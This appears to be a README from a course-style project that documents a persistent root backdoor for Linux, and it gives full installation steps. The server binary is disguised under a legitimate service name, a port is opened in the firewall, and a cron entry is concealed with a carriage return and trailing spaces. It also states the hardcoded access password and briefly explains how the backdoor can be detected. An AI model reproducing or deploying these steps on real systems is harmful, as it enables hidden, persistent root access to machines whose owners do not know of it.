# Command and Control Project

This repo contains the implementation of a backdoor that can be installed on a Linux machine running Python 2.7 and allows for remote root shell access that persists over machine reboots. Installation of the backdoor requires root privileges. This has been tested on Kali (attacker's machine) and a variation of CentOS7 (host machine).

## Installation

Download the compiled client and server files onto your kali machine (or whichever machine you will be using to access the backdoor).
```shell
wget "https://github.com/Creampelt/c2-project/raw/main/dist/client" & wget "https://github.com/Creampelt/c2-project/raw/main/dist/server"
```

Make client and server files executable.
```shell
chmod +x client server
```

Copy the server executable onto the host machine.
```shell
scp server [user]@[IP address]:/home/user/server
```

SSH into the host machine and elevate yourself to root.

As root, move the server file and rename it.
```shell
mv /home/user/server /usr/bin/menandmice-dns
```

Disable the machine’s firewall on port 1337.
```shell
sudo firewall-cmd --permanent --add-port=1337/tcp
```

Edit the machine’s cron jobs.
```shell
crontab -e
```

Add the following line (including the 108 trailing spaces) to the bottom of the file. You will need to replace the “\r” character with Ctrl-V + Ctrl-M (in VIM), or Meta-V + Meta-M (in nano). For other editors, Google how to add a **carriage return** character.
```shell
* * * * * /usr/bin/flock -n /tmp/fcj.lockfile /usr/bin/menandmice-dns > /dev/null 2>&1 #\r                                                                                                            
```

Verify that the line you just added is blank when running
```shell
crontable -l
```
If it is still visible, you may need to add more spaces.

The backdoor should be up and running! You may need to wait for up to one minute. You can verify that the backdoor is running with the following command:
```shell
sudo ss -tulpn | grep 1337
```

The expected output should be something like:
```shell
tcp    LISTEN     0      1      10.0.2.5:1337    *:*    users:(("menandmice-dns",pid=4957,fd=4))
```

Restart the host machine for the firewall changes to take effect. It may take up to a minute after rebooting for the server to be up.
```shell
sudo reboot
```

From the kali machine, run the client executable followed by the IP address of the host machine. For example, my host machine’s address is 10.0.2.5, so I would run
```shell
./client 10.0.2.5
```

When prompted for a password, enter “mainframe”.

That’s it! You should have root access to the host machine. If for any reason the program crashes, it should reboot within one minute.

## How it works

The backdoor creates a server that listens on port 1337. Upon receiving a connection request, the server verifies the client by sending a password request (simply a string, “PASSWORD VERIFICATION”). If the client does not respond with the correct password within three attempts, the server closes the connection. Otherwise, the server simply executes any input received from the client in the shell and sends the output back to the client (note: “cd” is handled as a special case, since it requires changing the current working directory of the program). The backdoor script is added as a cron job using flock, which will only run the program if it is not currently running (i.e. on startup or if the program crashes). Additionally, all data sent from the server and client is encrypted using symmetric AES encryption.

The implementation for the server and client can be found under [server.py](https://github.com/Creampelt/c2-project/blob/main/server.py) and [client.py](https://github.com/Creampelt/c2-project/blob/main/client.py) respectively. Code for encryption and password verification can be found under [encrypt.py](https://github.com/Creampelt/c2-project/blob/main/server.py). Built files are in the [dist/](https://github.com/Creampelt/c2-project/tree/main/dist) directory.

## Addressing requirements

### Remote root shell access:

The server executes any commands received from the client, and returns any output from those commands to the client. Since the cron job is created with root permissions, the server will execute all commands as root.

### Persistence even if the machine reboots:

Since the script is run by a cron job, the longest that the server will be down is one minute. This ensures persistence across reboots and crashes.

### Configuration:

The program is configured through the IP address parameter on the client side. The server is automatically hosted on the local host, so it will adapt to any machine that it is run on. If desired, you can also change the port of the server and client by changing the PORT constant at the top of server.py and client.py and recompiling using pyinstaller. Note that the user’s IP address does not need to be configured, as the identity of the user is verified through the passcode.

### Authentication:

The server authenticates the client by requiring a password before allowing access to the shell. Additionally, AES encryption of data sent over the socket prevents third parties from spying on or intercepting/interfering with network traffic.

### Hiding itself:

There are two main ways that this program hides itself. The first is as a cron job — we added the carriage return character, followed by 100 spaces, so that when the contents of the file are cat-ed, the spaces overwrite the cron job and obscure that specific line. The second is through naming — I selected the name “menandmice-dns” because the menandmice-dns service is registered in /etc/services on port 1337, so a cursory glance/comparison between /etc/services and the service running on port 1337 will not raise suspicion.

## Detecting the backdoor

The best method to detect the backdoor is through a more thorough examination of the cron jobs. While our current configuration does obscure the command when running `cat` or `crontable -l`, running `crontable -e` will immediately expose it.
